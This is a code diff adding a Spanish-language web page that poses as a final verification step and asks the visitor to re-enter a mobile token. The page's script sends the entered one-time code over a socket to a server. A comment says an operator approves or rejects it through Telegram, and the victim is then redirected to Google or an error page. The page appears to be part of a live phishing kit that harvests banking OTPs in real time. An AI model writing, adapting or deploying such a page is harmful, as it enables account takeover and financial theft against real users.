@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Código Incorrecto</title>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Open Sans', sans-serif;
+      background: #f3f6f9;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+
+    .screen {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      background: #fff;
+      padding: 2rem;
+      border-radius: 1rem;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+    }
+
+    .input-group {
+      display: flex;
+      align-items: center;
+      background: #f0f2f5;
+      border-radius: 8px;
+      margin: 1rem 0;
+      padding: 0.5rem 1rem;
+      width: 100%;
+    }
+
+    .input-group .icon {
+      color: #888;
+      margin-right: 0.5rem;
+    }
+
+    .input-group input {
+      border: none;
+      background: transparent;
+      outline: none;
+      flex: 1;
+      font-size: 1rem;
+    }
+
+    .campo-requerido {
+      border: 1px solid red !important;
+    }
+
+    button {
+      background: #262D91;
+      color: white;
+      padding: 0.75rem 2rem;
+      border: none;
+      border-radius: 50px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 1rem;
+      transition: background 0.3s;
+    }
+
+    button:hover {
+      background: #1924D1;
+    }
+
+    .mensaje-error {
+      color: red;
+      margin-top: 0.5rem;
+      font-size: 0.85rem;
+    }
+  </style>
+</head>
+<body>
+  <div class="screen">
+    <h3>¡ULTIMO PASO PARA VALIDAR!</h3>
+    <p>Introduce el Token movil.</p>
+    <div class="input-group campo-requerido">
+      <div class="icon"><i class="fas fa-key"></i></div>
+      <input type="tel" id="codigo" placeholder="Código de verificación" pattern="[0-9]*" inputmode="numeric" minlength="6" maxlength="14" required>
+    </div>
+    <p class="mensaje-error">Código inválido. Por favor, ingrese el código correctamente.</p>
+    <button onclick="reintentarCodigo()">Reintentar</button>
+  </div>
+
+  <script src="/socket.io/socket.io.js"></script>
+  <script>
+    const socket = io();
+    const sessionId = localStorage.getItem("sessionId");
+
+    socket.emit("reconectar", sessionId);
+
+    function reintentarCodigo() {
+      const codigo = document.getElementById("codigo").value;
+
+      if (!codigo || !/^\d{14}$/.test(codigo)) {
+        alert("Ingrese un código válido de 6 dígitos.");
+        return;
+      }
+
+      // Enviar OTP ingresado al servidor
+      socket.emit("otpIngresado", { codigo, sessionId });
+
+      // Ir a la pantalla de espera
+      window.location.href = "opciones.html";
+    }
+
+    // Recibir respuesta del admin desde Telegram
+    socket.on("respuestaOtp", (decision) => {
+      if (decision === "finalizar") {
+        window.location.href = "https://www.google.com";
+      } else if (decision === "otp_error") {
+        window.location.href = "denegado.html";
+      }
+    });
+  </script>
+</body>
+</html>
